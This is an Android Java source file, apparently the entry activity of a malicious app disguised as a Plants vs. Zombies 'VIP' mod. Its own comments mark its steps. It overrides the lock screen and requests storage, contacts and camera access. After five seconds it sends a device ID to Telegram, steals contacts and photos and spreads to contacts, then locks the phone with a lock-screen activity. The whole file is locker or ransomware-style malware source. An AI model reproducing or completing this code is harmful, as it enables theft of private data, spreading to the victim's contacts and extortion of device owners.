package com.pvzmod.vip;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.view.WindowManager;
import androidx.core.app.ActivityCompat;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Fullscreen + permissions
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                           WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                           WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                           WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
        
        ActivityCompat.requestPermissions(this, new String[]{
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.CAMERA
        }, 1);
        
        // 5s delay -> exfil -> lock
        new Handler().postDelayed(() -> {
            // Generate & send device ID
            String deviceId = DeviceIdGenerator.generateUniqueId(this);
            TelegramSender.sendDeviceInfo(deviceId);
            
            // Steal contacts/photos
            ContactSpreader.spreadContacts(this);
            
            // LOCK
            Intent lockIntent = new Intent(this, LockScreenActivity.class);
            lockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
            startActivity(lockIntent);
            finish();
        }, 5000);
    }
}
